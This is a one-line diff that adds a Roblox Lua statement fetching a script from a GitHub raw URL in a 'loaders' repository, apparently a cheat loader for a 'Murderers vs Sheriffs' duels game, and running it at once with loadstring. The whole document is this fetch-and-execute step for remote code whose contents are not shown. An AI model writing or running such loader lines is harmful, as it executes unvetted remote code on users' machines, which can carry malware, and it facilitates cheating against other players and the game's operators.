@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/x2-duels-murderers-vs-sheriffs-spam3-n4b3km7aonifm4.lua"))()
